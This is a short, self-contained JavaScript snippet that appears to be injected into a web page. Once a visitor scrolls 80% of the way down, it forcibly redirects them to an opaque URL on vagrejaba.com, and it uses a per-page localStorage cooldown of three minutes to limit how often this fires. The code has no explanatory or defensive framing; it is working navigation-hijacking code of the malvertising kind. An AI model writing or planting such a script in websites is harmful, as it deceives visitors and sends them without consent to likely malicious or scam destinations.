(function () {
  let redirected = false;
  const REDIRECT_URL = "https://vagrejaba.com/bp3MV/0.Pl3mplvmbdmBVAJsZvDF0d2HMQTXg/3/M_DUM/xjL_TUYtxoOgDFc/w/MBzIIp";
  const COOLDOWN_TIME = 3 * 60 * 1000; // 3 minutes in milliseconds
  const STORAGE_KEY = "scrollRedirectTimestamp_" + window.location.pathname;

  function checkScroll() {
    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
    const windowHeight = window.innerHeight || document.documentElement.clientHeight;
    const fullHeight = document.documentElement.scrollHeight;

    const scrollPercent = (scrollTop + windowHeight) / fullHeight;

    const lastRedirect = localStorage.getItem(STORAGE_KEY);
    const now = Date.now();

    if (scrollPercent >= 0.80 && !redirected) {
      if (!lastRedirect || now - lastRedirect > COOLDOWN_TIME) {
        redirected = true;
        localStorage.setItem(STORAGE_KEY, now);
        window.location.href = REDIRECT_URL;
      }
    }
  }

  window.addEventListener('scroll', checkScroll);
})();
